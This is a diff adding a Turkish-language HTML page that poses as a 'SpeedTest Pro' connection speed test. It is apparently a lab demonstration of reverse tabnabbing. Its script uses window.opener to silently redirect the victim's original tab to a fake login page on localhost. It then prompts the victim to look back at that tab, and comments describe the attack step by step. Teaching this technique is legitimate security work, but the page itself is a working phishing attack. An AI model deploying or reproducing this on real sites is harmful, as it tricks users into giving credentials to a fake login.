@@ -1,0 +1,42 @@
+<!doctype html>
+<html lang="tr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SpeedTest Pro — Bağlantı Hızı</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{min-height:100vh;background:#0f1726;color:#e6ebf5;
+      font-family:system-ui,-apple-system,"Segoe UI",sans-serif;
+      display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;padding:24px;text-align:center}
+    .spin{width:54px;height:54px;border:5px solid #24304d;border-top-color:#4f8cff;border-radius:50%;animation:s 1s linear infinite}
+    @keyframes s{to{transform:rotate(360deg)}}
+    h1{font-size:24px;font-weight:700}
+    p{color:#93a0bd;font-size:15px}
+  </style>
+</head>
+<body>
+  <div class="spin" id="spin"></div>
+  <h1>⚡ SpeedTest Pro</h1>
+  <p id="durum">Bağlantı hızınız ölçülüyor, lütfen bekleyin...</p>
+  <p id="hint" style="display:none;color:#ffd93b;font-size:16px;font-weight:600;margin-top:6px">
+    ✅ Test tamamlandı! Bu arada... önceki sekmenize bir göz atın 👀
+  </p>
+
+  <script>
+    // --- REVERSE TABNABBING ---
+    // Bu sayfa yeni sekmede acildi. 'window.opener' = bizi acan (kurbanin) sekmesi.
+    // rel="opener" sayesinde ona erisebiliyoruz -> onu sessizce sahte girise ceviriyoruz.
+    // Kurban hiz testine bakarken, arkadaki Teknopanorama sekmesi degisti bile.
+    if (window.opener) {
+      window.opener.location = "http://localhost:5173/tab-sahte-giris";
+    }
+    // Demo: 5 sn sonra kurbani eski sekmeye yonlendiren ipucu goster.
+    setTimeout(function () {
+      document.getElementById("spin").style.display = "none";
+      document.getElementById("durum").style.display = "none";
+      document.getElementById("hint").style.display = "block";
+    }, 5000);
+  </script>
+</body>
+</html>
